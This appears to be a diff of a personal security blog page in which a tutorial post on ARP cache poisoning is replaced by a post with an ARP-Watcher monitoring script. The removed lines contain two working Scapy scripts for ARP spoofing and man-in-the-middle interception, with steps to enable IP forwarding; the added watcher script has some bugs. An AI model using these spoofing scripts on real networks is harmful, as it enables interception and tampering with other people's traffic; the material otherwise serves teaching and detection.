@@ -3,18 +3,18 @@
 <head>
   <meta charset="utf-8">
   
-  <title>ARP cache Poisoning | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
+  <title>ARP-Watcher | &lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="What is ARP cache Poisoning?In computer networking, Arp spoofing,ARP cache poison routing, is a techniqueby which an attacker sends (spoofed) Address Resolution Protocol(ARP) messagesonto a local area">
+  <meta name="description" content="Source code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python#coding:utf-8&apos;&apos;&apos;This tool reports all newly con">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ARP cache Poisoning">
-<meta property="og:url" content="http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/index.html">
+<meta property="og:title" content="ARP-Watcher">
+<meta property="og:url" content="http://0daybug.github.io/2016/07/02/ARP-Watcher/index.html">
 <meta property="og:site_name" content="<(￣ c￣)y▂ξ 真煩,來哈根草吧~">
-<meta property="og:description" content="What is ARP cache Poisoning?In computer networking, Arp spoofing,ARP cache poison routing, is a techniqueby which an attacker sends (spoofed) Address Resolution Protocol(ARP) messagesonto a local area">
-<meta property="og:updated_time" content="2016-06-09T12:16:22.000Z">
+<meta property="og:description" content="Source code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python#coding:utf-8&apos;&apos;&apos;This tool reports all newly con">
+<meta property="og:updated_time" content="2016-07-02T09:39:35.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ARP cache Poisoning">
-<meta name="twitter:description" content="What is ARP cache Poisoning?In computer networking, Arp spoofing,ARP cache poison routing, is a techniqueby which an attacker sends (spoofed) Address Resolution Protocol(ARP) messagesonto a local area">
+<meta name="twitter:title" content="ARP-Watcher">
+<meta name="twitter:description" content="Source code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python#coding:utf-8&apos;&apos;&apos;This tool reports all newly con">
   
     <link rel="alternative" href="/atom.xml" title="&lt;(￣ c￣)y▂ξ 真煩,來哈根草吧~" type="application/atom+xml">
   
@@ -216,11 +216,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-ARP-cache-Poisoning" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-ARP-Watcher" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2016/06/09/ARP-cache-Poisoning/" class="article-date">
-      <time datetime="2016-06-09T11:42:39.000Z" itemprop="datePublished">2016-06-09</time>
+      <a href="/2016/07/02/ARP-Watcher/" class="article-date">
+      <time datetime="2016-07-02T09:36:29.000Z" itemprop="datePublished">2016-07-02</time>
 </a>
     </div>
   
@@ -233,7 +233,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ARP cache Poisoning
+      ARP-Watcher
     </h1>
   
 
@@ -244,7 +244,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -254,36 +254,7 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="What-is-ARP-cache-Poisoning"><a href="#What-is-ARP-cache-Poisoning" class="headerlink" title="What is ARP cache Poisoning?"></a>What is ARP cache Poisoning?</h2><p>In computer networking, Arp spoofing,ARP cache poison routing, is a technique<br>by which an attacker sends (spoofed) Address Resolution Protocol(ARP) messages<br>onto a local area network.Generally, the aim is to associate the attacker’s<br>MAC address with the IP address of another host, such as the default gateway,<br>causing any traffic meant for that IP address to be sent to the attacker instead.</p>
-<p>Arp spoofing may allow an attacker to intercept data frames on a network, modify<br>the traffic, or stop all traffic. Often the attack is used as an opening for other<br>attacks, such as denial of service, man in the middle, or session hijacking attacks.</p>
-<p>The attack can only be used on networks that use the address resolution protocol,<br>and is limited to local network segments.</p>
-<h2 id="How-to-create-an-attack-using-Scapy"><a href="#How-to-create-an-attack-using-Scapy" class="headerlink" title="How to create an attack using Scapy?"></a>How to create an attack using Scapy?</h2><p>code Part:</p>
-<p>import sys<br>import time<br>from scapy.all import sendp, ARP, Ether</p>
-<p>if len(sys.argv) &lt; 3:<br>    print sys.argv[0] + “: ,<target> <spoof_ip>“<br>        sys.exit(1)</spoof_ip></target></p>
-<p>iface = “eth0”<br>target_ip = sys.argv[1]<br>fake_ip = sys.argv[2]</p>
-<p>ethernet = Ether()<br>arp = ARP(pdst = target_ip, psrc = fake_ip, op=”is-at”)<br>packet = ethernet / arp</p>
-<p>while True:<br>    sendp(packet, iface=iface)<br>    time.sleep(10)</p>
-<h2 id="How-did-it-work"><a href="#How-did-it-work" class="headerlink" title="How did it work?"></a>How did it work?</h2><p>With the help of Scapy we construct a packet called packet consisting of an<br>Ether() and an ARP() header. In the ARP header we set the IP address of the<br>victim (target_ip) and the IP which we would like to hijack all connections<br>(fake_ip). As last parameter we define the OP-Code is-at, that declares the<br>packet as an ARP response.Afterwads the function sendp() and not the function<br>send(), because the packet should be sent on layer 2.The function send() sends<br>packets on layer 3.</p>
-<p>One last thing to remember to enable IP forwarding otherwise your host would<br>block the connection of the victim.</p>
-<p>sysctl net.ipv4.ip_forward=1</p>
-<p>Don’t forget to check the settings of your packet filter like IPtables, pf or<br>ipfw or just disable it.</p>
-<h2 id="Man-in-the-middle"><a href="#Man-in-the-middle" class="headerlink" title="Man in the middle"></a>Man in the middle</h2><p>A computer that wants to get knowledge about an IP address asks with an ARP<br>request. I write the program that waits for ARP requests and sends a spoofed in<br>every received request. In a switched environment this will result in every<br>connection flowing over the computer of the attacker, because in every ARP cache<br>there will be the MAC for every IP address. This solution is more elegant and<br>not as noisy as the one before, but still quite easy to detected for a trained admin</p>
-<p>Code Part:</p>
-<p>import sys<br>from scapy.all import sniff, sendp, ARP, Ether</p>
-<p>if len(sys.argv) &lt; 2:<br>    print sys.argv[0] + “ <iface>“<br>    sys.exit(0)</iface></p>
-<p>def arp_poison_callback(packet):</p>
-<pre><code>#Got ARP request?
-if packet[ARP].op == 1:
-    answer = Ether(dst=packet[ARP].hwsrc) / ARP()
-    answer[ARP].op = &quot;is-at&quot;
-    answer[ARP].hwdst = packet[ARP].hwsrc
-    answer[ARP].psrc = packet[ARP].pdst
-    answer[ARP].pdst = packet[ARP].psrc
-
-    print &quot;Fooling &quot; + packet[ARP].psrc + &quot; that &quot; + \
-            packet[ARP].pdst + &quot; is me&quot;
-    sendp(answer, iface=sys.argv[1])
-</code></pre><p>sniff(prn=arp_poison_callback,<br>      filter=”arp”,<br>      iface=sys.argv[1],<br>      store=0<br>    )</p>
+        <h3 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a>Source code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span><br><span class="line">This tool reports all newly connected devices to our network</span><br><span class="line"> therefore it has to remember all IP to MAC resolutions.</span><br><span class="line"> Additionally it can detect if a device suddenly changes</span><br><span class="line"> its MAC address.</span><br><span class="line">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> sniff, ARP</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> signal, SIGINT</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arp_watcher_db_file = <span class="string">"/var/cache/arp-watcher.db"</span></span><br><span class="line">ip_mac = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sig_int_handler</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Got SIGINT. Saving ARP database..."</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(arp_watcher_db_file, <span class="string">"w"</span>)</span><br><span class="line">        <span class="keyword">for</span> (ip, mac) <span class="keyword">in</span> ip_mac.items():</span><br><span class="line">            f.write(ip + <span class="string">" "</span> + mac + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Done."</span></span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Cannot write file "</span> + arp_watcher_db_file</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">watch_arp</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="comment">#Got is-at pkt (ARP response)</span></span><br><span class="line">    <span class="keyword">if</span>  pkt[ARP].op == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> pkt[ARP].hwsrc + <span class="string">" "</span> + pkt[ARP].psrc</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Device is new. Remember it.</span></span><br><span class="line">        <span class="keyword">if</span> ip_mac.get(pkt[ARP].psrc) == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Found new device "</span> + pkt[ARP].hwsrc + <span class="string">" "</span> + pkt[ARP].psrc</span><br><span class="line">            ip_mac[pkt[ARP].psrc] = pkt[ARP].hwsrc</span><br><span class="line"></span><br><span class="line">        <span class="comment">#Device is known but has different IP</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> ip_mac.get(pkt[ARP].psrc) <span class="keyword">and</span> ip_mac[pkt[ARP].psrc] != pkt[ARP].hws</span><br><span class="line">rc:</span><br><span class="line">            <span class="keyword">print</span> pkt[ARP].hwsrc + <span class="string">" has got new ip "</span> + pkt[ARP].psrc + <span class="string">"(old "</span></span><br><span class="line">+ ip_mac[pkt[ARP].psrc] + <span class="string">")"</span></span><br><span class="line"></span><br><span class="line">signal(SIGINT, sig_int_handler)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">print</span> sys.argv[<span class="number">0</span>] + <span class="string">" &lt;iface&gt;"</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    fh = open(arp_watcher_db_file, <span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Cannot read file "</span> + arp_watcher_db_file</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fh:</span><br><span class="line">    line.chomp()</span><br><span class="line">    (ip, mac) = line.split(<span class="string">" "</span>)</span><br><span class="line">    ip_mac[IP] = mac</span><br><span class="line"></span><br><span class="line">sniff(prn=watch_arp,filter=<span class="string">"arp"</span>, iface=sys.argv[<span class="number">1</span>], store=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -292,13 +263,13 @@ if packet[ARP].op == 1:
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2016/06/09/ARP-cache-Poisoning/">ARP cache Poisoning</a></p>
+        <p><span>本文标题:</span><a href="/2016/07/02/ARP-Watcher/">ARP-Watcher</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Dylan Kios 的个人博客">Dylan Kios</a></p>
-        <p><span>发布时间:</span>2016年06月09日 - 19时42分</p>
-        <p><span>最后更新:</span>2016年06月09日 - 20时16分</p>
+        <p><span>发布时间:</span>2016年07月02日 - 17时36分</p>
+        <p><span>最后更新:</span>2016年07月02日 - 17时39分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2016/06/09/ARP-cache-Poisoning/" title="ARP cache Poisoning">http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2016/07/02/ARP-Watcher/" title="ARP-Watcher">http://0daybug.github.io/2016/07/02/ARP-Watcher/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://0daybug.github.io/2016/07/02/ARP-Watcher/　　作者: Dylan Kios" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -311,16 +282,10 @@ if packet[ARP].op == 1:
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2016/06/12/Understanding-Network-Hacks-Scapy/">
-                    Understanding Network Hacks--Scapy
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2016/06/09/Socket/">
-                    Socket
+                <a href="/2016/06/22/Python-backdoor-program/">
+                    Python backdoor program
                 </a>
             </div>
         
@@ -331,7 +296,7 @@ if packet[ARP].op == 1:
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#What-is-ARP-cache-Poisoning"><span class="toc-number">1.</span> <span class="toc-text">What is ARP cache Poisoning?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-to-create-an-attack-using-Scapy"><span class="toc-number">2.</span> <span class="toc-text">How to create an attack using Scapy?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-did-it-work"><span class="toc-number">3.</span> <span class="toc-text">How did it work?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Man-in-the-middle"><span class="toc-number">4.</span> <span class="toc-text">Man in the middle</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-code"><span class="toc-number">1.</span> <span class="toc-text">Source code</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
@@ -395,7 +360,7 @@ if packet[ARP].op == 1:
   
   <div class="duoshuo" id="comments">
     <!-- 多说评论框 start -->
-    <div class="ds-thread" data-thread-key="ARP-cache-Poisoning" data-title="ARP cache Poisoning" data-url="http://0daybug.github.io/2016/06/09/ARP-cache-Poisoning/"></div>
+    <div class="ds-thread" data-thread-key="ARP-Watcher" data-title="ARP-Watcher" data-url="http://0daybug.github.io/2016/07/02/ARP-Watcher/"></div>
     <!-- 多说评论框 end -->
     <!-- 多说公共JS代码 start (一个网页只需插入一次) -->
     <script type="text/javascript">
@@ -419,15 +384,13 @@ if packet[ARP].op == 1:
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2016/06/12/Understanding-Network-Hacks-Scapy/" title="上一篇: Understanding Network Hacks--Scapy">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2016/06/09/Socket/" title="下一篇: Socket">
+            <a href="/2016/06/22/Python-backdoor-program/" title="下一篇: Python backdoor program">
                 <i class="fa fa-angle-right"></i>
             </a>
         
